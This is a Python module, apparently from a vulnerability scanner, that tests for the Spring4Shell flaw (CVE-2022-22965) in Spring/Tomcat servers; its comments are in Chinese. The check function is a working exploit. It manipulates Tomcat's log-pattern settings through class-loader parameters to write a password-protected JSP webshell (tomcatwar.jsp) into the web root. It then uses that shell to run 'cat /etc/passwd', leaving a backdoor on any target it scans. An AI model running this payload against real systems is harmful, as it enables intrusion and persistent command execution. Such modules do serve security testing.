#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22965.py
   Description :   CVE-2022-22965 漏洞检测模块（Spring4Shell 远程命令执行）
   Author :       sule01u
   date：          2023/10/8
"""
import random
import requests
import time
from urllib.parse import urljoin, urlparse
from colorama import Fore
from utils.custom_headers import USER_AGENTS, TIMEOUT
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

# CVE 编号
CVE_ID = "CVE-2022-22965"

# HTTP 请求头配置
HEADERS = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "User-Agent": random.choice(USER_AGENTS)
}

# 构建漏洞利用的请求参数
LOG_PATTERN = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
LOG_FILE_SUFFIX = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
LOG_FILE_DIR = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
LOG_FILE_PREFIX = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
LOG_FILE_DATE_FORMAT = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
ARG_PAYLOAD = "?" + "&".join([LOG_PATTERN, LOG_FILE_SUFFIX, LOG_FILE_DIR, LOG_FILE_PREFIX, LOG_FILE_DATE_FORMAT])


def check(url, dns_domain="", proxies=None, session=None):
    """
    检测 CVE-2022-22965 漏洞（Spring4Shell 远程命令执行）
    :param url: 待检测的目标 URL
    :param dns_domain: DNS 日志域名（不使用，仅保持接口一致性）
    :param proxies: 代理配置（可选）
    :param session: 复用的 Session 实例（可选）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
    session = session or requests.Session()

    try:
        # 1. 构建完整的 URL 并发送恶意请求以写入 JSP webshell
        url_with_payload = url + ARG_PAYLOAD
        session.get(url_with_payload, headers=HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)

        # 2. 等待 5 秒以确保 JSP 文件上传完成
        time.sleep(5)

        # 3. 构建 webshell 访问路径，并执行命令
        shell_url = urljoin(url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
        response = session.get(shell_url, headers=HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
        logger.debug(Fore.CYAN + f"[{response.status_code}]" + Fore.BLUE + f"[{response.headers}]",
                     extra={"target": shell_url})

        # 4. 检查返回内容中是否包含 "root:" 关键字，表示命令执行成功
        if response.status_code == 200 and "root:" in response.text:
            details = f"{CVE_ID} vulnerability detected at {shell_url}"
            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": shell_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": shell_url,
                "Details": details
            }

        # 5. 如果未在初始 URL 中检测到 webshell，尝试使用根 URL 访问 webshell
        parsed_url = urlparse(shell_url)
        root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        shell_url_root = urljoin(root_url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
        response_root = session.get(shell_url_root, headers=HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
        logger.debug(Fore.CYAN + f"[{response_root.status_code}]" + Fore.BLUE + f"[{response_root.headers}]",
                     extra={"target": shell_url_root})

        # 再次检查返回内容中是否包含 "root:" 关键字
        if response_root.status_code == 200 and "root:" in response_root.text:
            details = f"{CVE_ID} vulnerability detected at {shell_url_root}"
            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": shell_url_root})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": shell_url_root,
                "Details": details
            }

        # 如果未检测到漏洞，返回 False
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}

    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        # 捕获所有请求异常，并记录到日志
        logger.error(f"[Request Error：{e}]", extra={"target": url})
        return False, {}
    except Exception as e:
        # 捕获所有其他未知异常，并记录到日志
        logger.error(f"[Unknown Error：{e}]", extra={"target": url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == '__main__':
    # 测试用例
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}

    # 测试 CVE-2022-22965 漏洞检测
    is_vul, res = check("http://localhost:8080/", proxies=proxy)
    print(is_vul, res)